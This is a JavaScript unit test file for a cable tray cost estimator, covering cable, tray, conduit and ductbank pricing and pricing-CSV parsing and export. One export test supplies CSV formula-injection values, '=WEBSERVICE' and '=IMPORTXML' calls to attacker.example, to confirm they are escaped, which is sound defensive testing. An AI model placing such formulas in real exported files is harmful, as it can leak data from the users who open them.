/**
 * Tests for analysis/costEstimate.mjs
 */
import assert from 'assert';
import {
  estimateCableCosts,
  estimateTrayCosts,
  estimateConduitCosts,
  estimateTraySupportCosts,
  estimateDuctbankCosts,
  ductbankConstructionPriceKey,
  summarizeCosts,
  DEFAULT_PRICES,
  DEFAULT_ESTIMATE_BASIS,
  calculateEscalationFactor,
  buildEstimateBasis,
  applyEstimateBasis,
  parsePricingCSV,
  exportPricingCSV,
  cableSizeKeyCandidates,
} from '../analysis/costEstimate.mjs';

function describe(name, fn) {
  console.log(name);
  fn();
}

function it(name, fn) {
  try {
    fn();
    console.log('  \u2713', name);
  } catch (err) {
    console.error('  \u2717', name, err.message || err);
    process.exitCode = 1;
  }
}

// ---------------------------------------------------------------------------
describe('DEFAULT_PRICES', () => {
  it('has cable prices for common AWG sizes', () => {
    assert.ok(DEFAULT_PRICES.cable['4 AWG'] > 0);
    assert.ok(DEFAULT_PRICES.cable['default'] > 0);
  });

  it('has tray prices for standard widths', () => {
    assert.ok(DEFAULT_PRICES.tray['12'] > 0);
    assert.ok(DEFAULT_PRICES.tray['default'] > 0);
  });

  it('has conduit prices for common trade sizes', () => {
    assert.ok(DEFAULT_PRICES.conduit['1'] > 0);
    assert.ok(DEFAULT_PRICES.conduit['default'] > 0);
  });

  it('has labor rates', () => {
    assert.ok(DEFAULT_PRICES.labor.cableInstall > 0);
    assert.ok(DEFAULT_PRICES.labor.trayInstall > 0);
  });
});

// ---------------------------------------------------------------------------
describe('source-aware estimate basis', () => {
  it('calculates escalation as current index divided by base index', () => {
    assert.strictEqual(calculateEscalationFactor(100, 125), 1.25);
  });

  it('does not invent civil or tray-support prices', () => {
    assert.strictEqual(DEFAULT_PRICES.traySupport.default, 0);
    assert.deepStrictEqual(DEFAULT_PRICES.construction, {});
    assert.deepStrictEqual(DEFAULT_PRICES.laborUnitHours, {});
  });

  it('keeps invalid index pairs neutral', () => {
    assert.strictEqual(calculateEscalationFactor(0, 125), 1);
    assert.strictEqual(calculateEscalationFactor(100, Number.NaN), 1);
  });

  it('combines regional wage and labor escalation factors', () => {
    const basis = buildEstimateBasis({
      nationalElectricianHourlyWage: 30,
      localElectricianHourlyWage: 36,
      laborBaseIndex: 100,
      laborCurrentIndex: 110,
    });
    assert.ok(Math.abs(basis.regionalLaborFactor - 1.2) < 1e-9);
    assert.ok(Math.abs(basis.laborEscalationFactor - 1.1) < 1e-9);
    assert.ok(Math.abs(basis.combinedLaborFactor - 1.32) < 1e-9);
  });

  it('applies material and labor factors independently', () => {
    const basis = buildEstimateBasis({
      materialBaseIndex: 100,
      materialCurrentIndex: 120,
      nationalElectricianHourlyWage: 30,
      localElectricianHourlyWage: 33,
      laborBaseIndex: 100,
      laborCurrentIndex: 105,
    });
    const adjusted = applyEstimateBasis(DEFAULT_PRICES, basis);
    assert.ok(Math.abs(adjusted.cable['4 AWG'] - DEFAULT_PRICES.cable['4 AWG'] * 1.2) < 1e-9);
    assert.ok(Math.abs(adjusted.fitting - DEFAULT_PRICES.fitting * 1.2) < 1e-9);
    assert.ok(Math.abs(adjusted.labor.cableInstall - DEFAULT_PRICES.labor.cableInstall * 1.155) < 1e-9);
    assert.strictEqual(adjusted.laborProductivity.cablePullFtPerHr, DEFAULT_PRICES.laborProductivity.cablePullFtPerHr);
  });

  it('carries public-source defaults without claiming a selected series', () => {
    const basis = buildEstimateBasis();
    assert.strictEqual(basis.nationalElectricianHourlyWage, DEFAULT_ESTIMATE_BASIS.nationalElectricianHourlyWage);
    assert.strictEqual(basis.materialIndexDocumented, false);
    assert.strictEqual(basis.laborIndexDocumented, false);
  });
});

// ---------------------------------------------------------------------------
describe('estimateCableCosts', () => {
  const cables = [
    { cable_tag: 'C-001', conductor_size: '4 AWG', conductors: 3 },
    { cable_tag: 'C-002', conductor_size: '2/0', conductors: 3 },
  ];
  const routes = [
    { cable: 'C-001', total_length: '200' },
    { cable: 'C-002', total_length: '150' },
  ];

  it('returns one item per cable', () => {
    const items = estimateCableCosts(cables, routes);
    assert.strictEqual(items.length, 2);
  });

  it('assigns category Cable', () => {
    const items = estimateCableCosts(cables, routes);
    assert.ok(items.every(i => i.category === 'Cable'));
  });

  it('uses route length when available', () => {
    const items = estimateCableCosts(cables, routes);
    assert.strictEqual(items[0].quantity, 200);
    assert.strictEqual(items[1].quantity, 150);
  });

  it('applies physical-run multiplicity while retaining conductor footage evidence', () => {
    const items = estimateCableCosts([
      { cable_tag: 'C-PAR', conductor_size: '4 AWG', conductors: 3, parallel_sets: 2 },
    ], [{ cable: 'C-PAR', total_length: 50 }]);
    assert.strictEqual(items[0].routeLengthFt, 50);
    assert.strictEqual(items[0].runCount, 2);
    assert.strictEqual(items[0].quantity, 100);
    assert.strictEqual(items[0].extendedQuantity, 300);
    assert.strictEqual(items[0].priceKey, '4 AWG');
  });

  it('computes non-zero costs for known sizes', () => {
    const items = estimateCableCosts(cables, routes);
    assert.ok(items[0].materialCost > 0);
    assert.ok(items[0].laborCost > 0);
    assert.ok(items[0].totalCost > 0);
  });

  it('carries manufacturer catalog fields into line items', () => {
    const items = estimateCableCosts([
      {
        cable_tag: 'C-CAT',
        conductor_size: '4 AWG',
        conductors: 3,
        manufacturer: 'Prysmian',
        catalog_number: 'XHHW-4',
        approved_part: true,
        catalog_source: 'Approved list',
        catalog_last_verified: '2026-05-22'
      }
    ], [{ cable: 'C-CAT', total_length: '10' }]);
    assert.strictEqual(items[0].manufacturer, 'Prysmian');
    assert.strictEqual(items[0].catalogNumber, 'XHHW-4');
    assert.strictEqual(items[0].approvedPart, true);
  });

  it('keeps string false catalog approvals unapproved in line items', () => {
    const items = estimateCableCosts([
      {
        cable_tag: 'C-CAT-FALSE',
        conductor_size: '4 AWG',
        conductors: 3,
        manufacturer: 'Prysmian',
        catalog_number: 'XHHW-4-FALSE',
        approved_part: 'false',
        approval_status: 'rejected'
      }
    ], [{ cable: 'C-CAT-FALSE', total_length: '10' }]);
    assert.strictEqual(items[0].approvedPart, false);
    assert.strictEqual(items[0].approvalStatus, 'rejected');
  });

  it('falls back to default price for unknown size', () => {
    const unknownCable = [{ cable_tag: 'X-1', conductor_size: 'UNKNOWN', conductors: 1 }];
    const unknownRoute = [{ cable: 'X-1', total_length: '100' }];
    const items = estimateCableCosts(unknownCable, unknownRoute);
    assert.strictEqual(items[0].unitPrice, DEFAULT_PRICES.cable['default']);
    assert.strictEqual(items[0].usedDefaultPrice, true);
    assert.strictEqual(items[0].priceKey, 'default');
  });

  it('returns empty array for empty input', () => {
    assert.deepStrictEqual(estimateCableCosts([], []), []);
  });
});

// ---------------------------------------------------------------------------
describe('estimateTrayCosts', () => {
  const trays = [
    { tray_id: 'T-01', tray_type: 'Ladder', inside_width: '12', length_ft: '100' },
    { tray_id: 'T-02', tray_type: 'Solid', inside_width: '6', length_ft: '50', fitting_count: '4' },
  ];

  it('returns one item per tray', () => {
    assert.strictEqual(estimateTrayCosts(trays).length, 2);
  });

  it('assigns category Tray', () => {
    assert.ok(estimateTrayCosts(trays).every(i => i.category === 'Tray'));
  });

  it('uses length_ft correctly', () => {
    const items = estimateTrayCosts(trays);
    assert.strictEqual(items[0].quantity, 100);
    assert.strictEqual(items[1].quantity, 50);
  });

  it('adds fitting cost when fitting_count provided', () => {
    const items = estimateTrayCosts(trays);
    const withFittings = items[1].materialCost;
    const withoutFittings = estimateTrayCosts([{ ...trays[1], fitting_count: '0' }])[0].materialCost;
    assert.ok(withFittings > withoutFittings);
  });

  it('adds fitting labor only when governed fitting productivity is supplied', () => {
    const item = estimateTrayCosts([trays[1]], {
      labor: { trayInstall: 100 },
      laborProductivity: { trayInstallFtPerHr: 25, trayFittingInstallEaPerHr: 2 },
    })[0];
    assert.strictEqual(item.routeLaborHrs, 2);
    assert.strictEqual(item.fittingLaborHrs, 2);
    assert.strictEqual(item.laborHrs, 4);
    assert.strictEqual(item.laborCost, 400);
  });
});

// ---------------------------------------------------------------------------
describe('tray support and ductbank assembly costs', () => {
  it('uses route-ledger tray support counts and catalog-keyed pricing', () => {
    const item = estimateTraySupportCosts([{
      tray_id: 'T-S1',
      inside_width: '12',
      support_quantity: 11,
      support_catalog_number: 'SUP-12-A',
    }], {
      traySupport: { 'SUP-12-A': 25 },
      labor: { trayInstall: 100 },
      laborProductivity: { traySupportInstallEaPerHr: 2 },
    })[0];
    assert.strictEqual(item.priceBasis, 'catalog-number');
    assert.strictEqual(item.materialCost, 275);
    assert.strictEqual(item.laborHrs, 5.5);
    assert.strictEqual(item.totalCost, 825);
  });

  it('prices mixed-unit ductbank BOM rows without inventing missing rates', () => {
    const ductbank = {
      tag: 'DB-1',
      coverDepth: 36,
      concrete_encasement: true,
      rightPad: 3,
      conduits: [
        { type: 'PVC Sch 40', trade_size: '2', x: 0, y: 0 },
        { type: 'PVC Sch 40', trade_size: '2', x: 4, y: 0 },
      ],
    };
    const quantityRows = [{ type: 'ductbank', id: 'DB-1', quantity: 100 }];
    const unpriced = estimateDuctbankCosts([ductbank], quantityRows);
    assert.strictEqual(unpriced.assemblies[0].ready, true);
    assert(unpriced.lineItems.length > 5);
    assert(unpriced.lineItems.every(item => item.unitPrice === 0 && item.laborHrs === 0));

    const construction = {};
    const laborUnitHours = {};
    unpriced.lineItems.forEach(item => {
      construction[item.priceKey] = 2;
      laborUnitHours[item.laborHoursKey] = 0.5;
    });
    const priced = estimateDuctbankCosts([ductbank], quantityRows, {
      construction,
      laborUnitHours,
      labor: { civilInstall: 100 },
    });
    const conduit = priced.lineItems.find(item => item.description.startsWith('PVC Sch 40 conduit'));
    assert.strictEqual(conduit.priceKey, 'ductbank.raceway.pvc-sch-40-conduit.2-in-trade-size');
    assert.strictEqual(conduit.quantity, 210);
    assert.strictEqual(conduit.materialCost, 420);
    assert.strictEqual(conduit.laborHrs, 105);
    assert.strictEqual(conduit.laborCost, 10500);
  });

  it('marks ductbank construction evidence incomplete when cover depth is absent', () => {
    const result = estimateDuctbankCosts([{
      tag: 'DB-NO-DEPTH',
      conduits: [{ conduit_type: 'PVC Sch 40', trade_size: '2', x: 0, y: 0 }],
    }], [{ type: 'ductbank', id: 'DB-NO-DEPTH', quantity: 50 }]);
    assert.strictEqual(result.assemblies[0].ready, false);
    assert(result.assemblies[0].blockingReasons.some(reason => reason.includes('cover/depth')));
  });

  it('creates deterministic construction keys from BOM identity', () => {
    assert.strictEqual(ductbankConstructionPriceKey({
      category: 'Civil',
      item: 'Concrete encasement',
      specification: '12 in W × 8 in H',
    }), 'ductbank.civil.concrete-encasement.12-in-w-8-in-h');
  });
});

// ---------------------------------------------------------------------------
describe('estimateConduitCosts', () => {
  const conduits = [
    { conduit_id: 'CND-01', conduit_type: 'EMT', trade_size: '2', length_ft: '80' },
  ];

  it('returns one item per conduit', () => {
    assert.strictEqual(estimateConduitCosts(conduits).length, 1);
  });

  it('assigns category Conduit', () => {
    assert.ok(estimateConduitCosts(conduits).every(i => i.category === 'Conduit'));
  });

  it('uses known trade size price', () => {
    const items = estimateConduitCosts(conduits);
    assert.strictEqual(items[0].unitPrice, DEFAULT_PRICES.conduit['2']);
  });
});

// ---------------------------------------------------------------------------
describe('summarizeCosts', () => {
  const lineItems = [
    { category: 'Cable', materialCost: 500, laborCost: 200, totalCost: 700 },
    { category: 'Cable', materialCost: 300, laborCost: 100, totalCost: 400 },
    { category: 'Tray',  materialCost: 800, laborCost: 250, totalCost: 1050 },
  ];

  it('sums by category', () => {
    const { categories } = summarizeCosts(lineItems);
    assert.strictEqual(categories.Cable.totalCost, 1100);
    assert.strictEqual(categories.Tray.totalCost, 1050);
  });

  it('computes grand total', () => {
    const { grandTotal } = summarizeCosts(lineItems);
    assert.strictEqual(grandTotal, 2150);
  });

  it('separates material and labor in grand totals', () => {
    const { grandMaterial, grandLabor } = summarizeCosts(lineItems);
    assert.strictEqual(grandMaterial, 1600);
    assert.strictEqual(grandLabor, 550);
  });

  it('returns zeros for empty input', () => {
    const { grandTotal } = summarizeCosts([]);
    assert.strictEqual(grandTotal, 0);
  });
});

// ---------------------------------------------------------------------------
const FULL_CSV = `# CableTrayRoute Pricing Book
# Source: Distributor ABC
# Date: 2026-04-11
category,key,unit_price,unit,source,date
cable,14 AWG,0.22,$/ft,Distributor ABC,2026-04-11
cable,12 AWG,0.30,$/ft,Distributor ABC,2026-04-11
cable,default,1.65,$/ft,Distributor ABC,2026-04-11
tray,12,7.20,$/ft,Distributor ABC,2026-04-11
tray,default,7.50,$/ft,Distributor ABC,2026-04-11
conduit,1,1.35,$/ft,Distributor ABC,2026-04-11
conduit,default,3.20,$/ft,Distributor ABC,2026-04-11
fitting,,42.00,$,Distributor ABC,2026-04-11
labor,cableInstall,80.00,$/hr,Distributor ABC,2026-04-11
labor,trayInstall,95.00,$/hr,Distributor ABC,2026-04-11
labor,conduitInstall,90.00,$/hr,Distributor ABC,2026-04-11
productivity,cablePullFtPerHr,140,ft/hr,Distributor ABC,2026-04-11
`;

describe('parsePricingCSV — valid full CSV', () => {
  const { prices, meta } = parsePricingCSV(FULL_CSV);

  it('parses cable prices into prices.cable map', () => {
    assert.strictEqual(prices.cable['14 AWG'], 0.22);
    assert.strictEqual(prices.cable['12 AWG'], 0.30);
    assert.strictEqual(prices.cable['default'], 1.65);
  });

  it('parses tray prices into prices.tray map', () => {
    assert.strictEqual(prices.tray['12'], 7.20);
    assert.strictEqual(prices.tray['default'], 7.50);
  });

  it('parses conduit prices into prices.conduit map', () => {
    assert.strictEqual(prices.conduit['1'], 1.35);
    assert.strictEqual(prices.conduit['default'], 3.20);
  });

  it('parses labor rates into prices.labor map', () => {
    assert.strictEqual(prices.labor.cableInstall, 80.00);
    assert.strictEqual(prices.labor.trayInstall, 95.00);
    assert.strictEqual(prices.labor.conduitInstall, 90.00);
  });

  it('parses fitting price as scalar', () => {
    assert.strictEqual(prices.fitting, 42.00);
  });

  it('parses productivity values', () => {
    assert.strictEqual(prices.laborProductivity.cablePullFtPerHr, 140);
  });

  it('returns correct meta.source', () => {
    assert.strictEqual(meta.source, 'Distributor ABC');
  });

  it('returns correct meta.date', () => {
    assert.strictEqual(meta.date, '2026-04-11');
  });

  it('returns correct meta.rowCount', () => {
    assert.strictEqual(meta.rowCount, 12);
  });

  it('returns empty warnings array', () => {
    assert.ok(Array.isArray(meta.warnings));
    assert.strictEqual(meta.warnings.length, 0);
  });
});

// ---------------------------------------------------------------------------
describe('parsePricingCSV — partial CSV (cable only)', () => {
  const csv = `category,key,unit_price,unit,source,date
cable,4 AWG,1.40,$/ft,Local Supplier,2026-01-01
cable,default,2.00,$/ft,Local Supplier,2026-01-01
`;
  const { prices, meta } = parsePricingCSV(csv);

  it('populates prices.cable', () => {
    assert.strictEqual(prices.cable['4 AWG'], 1.40);
    assert.strictEqual(prices.cable['default'], 2.00);
  });

  it('does not include tray or conduit keys', () => {
    assert.strictEqual(prices.tray, undefined);
    assert.strictEqual(prices.conduit, undefined);
  });

  it('reports correct rowCount', () => {
    assert.strictEqual(meta.rowCount, 2);
  });
});

describe('parsePricingCSV — construction scope', () => {
  const csv = `category,key,unit_price,unit,source,date
tray_support,12,28,$/ea,Qualified takeoff,2026-08-25
construction,ductbank.civil.trench-excavation,18,$/CY,Qualified takeoff,2026-08-25
labor_unit_hours,ductbank.civil.trench-excavation,0.25,hr/CY,Qualified takeoff,2026-08-25
labor,civilInstall,110,$/hr,Qualified takeoff,2026-08-25
productivity,traySupportInstallEaPerHr,2,EA/hr,Qualified takeoff,2026-08-25
productivity,trayFittingInstallEaPerHr,4,EA/hr,Qualified takeoff,2026-08-25
`;
  const { prices, meta } = parsePricingCSV(csv);

  it('parses support, construction, civil labor, and mixed-unit labor evidence', () => {
    assert.strictEqual(prices.traySupport['12'], 28);
    assert.strictEqual(prices.construction['ductbank.civil.trench-excavation'], 18);
    assert.strictEqual(prices.laborUnitHours['ductbank.civil.trench-excavation'], 0.25);
    assert.strictEqual(prices.labor.civilInstall, 110);
    assert.strictEqual(prices.laborProductivity.traySupportInstallEaPerHr, 2);
    assert.strictEqual(prices.laborProductivity.trayFittingInstallEaPerHr, 4);
    assert.strictEqual(meta.rowCount, 6);
  });
});

// ---------------------------------------------------------------------------
describe('parsePricingCSV — malformed input', () => {
  it('skips rows with non-numeric unit_price', () => {
    const csv = `category,key,unit_price,unit,source,date
cable,12 AWG,N/A,$/ft,,
cable,10 AWG,0.48,$/ft,,
`;
    const { prices, meta } = parsePricingCSV(csv);
    assert.strictEqual(prices.cable['12 AWG'], undefined);
    assert.strictEqual(prices.cable['10 AWG'], 0.48);
    assert.ok(meta.warnings.some(w => w.includes('N/A')));
  });

  it('skips blank lines and comment lines', () => {
    const csv = `# this is a comment
category,key,unit_price,unit,source,date

# another comment
cable,8 AWG,0.70,$/ft,,
`;
    const { prices, meta } = parsePricingCSV(csv);
    assert.strictEqual(prices.cable['8 AWG'], 0.70);
    assert.strictEqual(meta.warnings.length, 0);
  });

  it('adds a warning for unrecognized categories', () => {
    const csv = `category,key,unit_price,unit,source,date
widget,foo,9.99,$/ea,,
`;
    const { meta } = parsePricingCSV(csv);
    assert.ok(meta.warnings.some(w => w.includes('widget')));
  });

  it('returns empty prices object for completely malformed CSV', () => {
    const { prices, meta } = parsePricingCSV('not,a,pricing,csv\ngarbage');
    assert.deepStrictEqual(prices, {});
    assert.strictEqual(meta.rowCount, 0);
  });

  it('skips unknown labor keys and warns', () => {
    const csv = `category,key,unit_price,unit,source,date
labor,unknownKey,99.00,$/hr,,
`;
    const { prices, meta } = parsePricingCSV(csv);
    assert.strictEqual(prices.labor, undefined);
    assert.ok(meta.warnings.some(w => w.includes('unknownKey')));
  });
});

// ---------------------------------------------------------------------------
describe('exportPricingCSV — roundtrip', () => {
  it('export then parse gives same cable prices', () => {
    const original = { cable: { '4 AWG': 1.30, 'default': 1.50 } };
    const csv = exportPricingCSV(original, { source: 'Test', date: '2026-04-11' });
    const { prices } = parsePricingCSV(csv);
    assert.strictEqual(prices.cable['4 AWG'], 1.30);
    assert.strictEqual(prices.cable['default'], 1.50);
  });

  it('export then parse gives same tray prices', () => {
    const original = { tray: { '12': 7.20, 'default': 7.00 } };
    const csv = exportPricingCSV(original, {});
    const { prices } = parsePricingCSV(csv);
    assert.strictEqual(prices.tray['12'], 7.20);
    assert.strictEqual(prices.tray['default'], 7.00);
  });

  it('export then parse gives same fitting price', () => {
    const original = { fitting: 42.50 };
    const csv = exportPricingCSV(original, {});
    const { prices } = parsePricingCSV(csv);
    assert.strictEqual(prices.fitting, 42.50);
  });

  it('export then parse preserves labor rates', () => {
    const original = { labor: { cableInstall: 82, trayInstall: 97, conduitInstall: 91 } };
    const csv = exportPricingCSV(original, {});
    const { prices } = parsePricingCSV(csv);
    assert.strictEqual(prices.labor.cableInstall, 82);
    assert.strictEqual(prices.labor.trayInstall, 97);
  });

  it('roundtrips construction and mixed-unit labor maps', () => {
    const original = {
      traySupport: { 12: 25 },
      construction: { 'ductbank.civil.trench-excavation': 18 },
      laborUnitHours: { 'ductbank.civil.trench-excavation': 0.25 },
      labor: { civilInstall: 110 },
    };
    const { prices } = parsePricingCSV(exportPricingCSV(original, {}));
    assert.strictEqual(prices.traySupport['12'], 25);
    assert.strictEqual(prices.construction['ductbank.civil.trench-excavation'], 18);
    assert.strictEqual(prices.laborUnitHours['ductbank.civil.trench-excavation'], 0.25);
    assert.strictEqual(prices.labor.civilInstall, 110);
  });

  it('CSV includes meta source and date in header comment', () => {
    const csv = exportPricingCSV({}, { source: 'IBEW Local', date: '2026-04-11' });
    assert.ok(csv.includes('IBEW Local'));
    assert.ok(csv.includes('2026-04-11'));
  });

  it('CSV starts with a comment block', () => {
    const csv = exportPricingCSV({});
    assert.ok(csv.startsWith('# CableTrayRoute Pricing Book'));
  });

  it('roundtrip of DEFAULT_PRICES preserves all cable entries', () => {
    const csv = exportPricingCSV(DEFAULT_PRICES, { source: 'RS Means 2024' });
    const { prices } = parsePricingCSV(csv);
    Object.entries(DEFAULT_PRICES.cable).forEach(([k, v]) => {
      assert.strictEqual(prices.cable[k], v, `Mismatch for cable key "${k}"`);
    });
  });

  it('neutralizes spreadsheet formulas in exported string fields', () => {
    const csv = exportPricingCSV(
      { cable: { '=WEBSERVICE("https://attacker.example")': 1.2 } },
      { source: '=IMPORTXML("https://attacker.example","//a")', date: '@SUM(1+1)' }
    );
    const { prices, meta } = parsePricingCSV(csv);
    assert.strictEqual(Object.keys(prices.cable)[0], '\'=WEBSERVICE("https://attacker.example")');
    assert.strictEqual(meta.source, '\'=IMPORTXML("https://attacker.example","//a")');
    assert.strictEqual(meta.date, '\'@SUM(1+1)');
  });

  it('quotes CSV fields that contain commas', () => {
    const csv = exportPricingCSV(
      { cable: { '4 AWG, special': 1.25 } },
      { source: 'Distributor, Inc.', date: '2026-04-11' }
    );
    const { prices, meta } = parsePricingCSV(csv);
    assert.strictEqual(prices.cable['4 AWG, special'], 1.25);
    assert.strictEqual(meta.source, 'Distributor, Inc.');
  });
});

describe('cable sizes as written in schedules map to the price table', () => {
  const price = size => estimateCableCosts([{ cable_tag: 'A', conductor_size: size, conductors: 1, length_ft: 100 }], [], {})[0];
  it('#12 AWG, 12 and 12 AWG all price as 12 AWG ($0.25/ft), not the $1.50 default', () => {
    for (const size of ['#12 AWG', '12', '12 AWG']) {
      const line = price(size);
      assert.strictEqual(line.unitPrice, DEFAULT_PRICES.cable['12 AWG'], size);
      assert.strictEqual(line.usedDefaultPrice, false, size);
    }
  });
  it('1/0 AWG, #1/0 and 4/0 AWG map to the 1/0 and 4/0 keys; 500 MCM to 500 kcmil', () => {
    assert.strictEqual(price('1/0 AWG').unitPrice, DEFAULT_PRICES.cable['1/0']);
    assert.strictEqual(price('#1/0').unitPrice, DEFAULT_PRICES.cable['1/0']);
    assert.strictEqual(price('4/0 AWG').unitPrice, DEFAULT_PRICES.cable['4/0']);
    assert.strictEqual(price('500 MCM').unitPrice, DEFAULT_PRICES.cable['500 kcmil']);
  });
  it('a leading conductor count and material suffix are ignored (3-#4 CU -> 4 AWG)', () => {
    assert.deepStrictEqual(cableSizeKeyCandidates('3-#4 CU'), ['4 AWG']);
  });
  it('a user price keyed exactly as the schedule writes it still wins', () => {
    const line = estimateCableCosts([{ cable_tag: 'A', conductor_size: '#12 AWG', conductors: 1, length_ft: 100 }], [],
      { cable: { '#12 AWG': 9.99 } })[0];
    assert.strictEqual(line.unitPrice, 9.99);
  });
  it('an unknown size still falls back to the flagged default', () => {
    const line = price('#22 AWG');
    assert.strictEqual(line.usedDefaultPrice, true);
  });
});
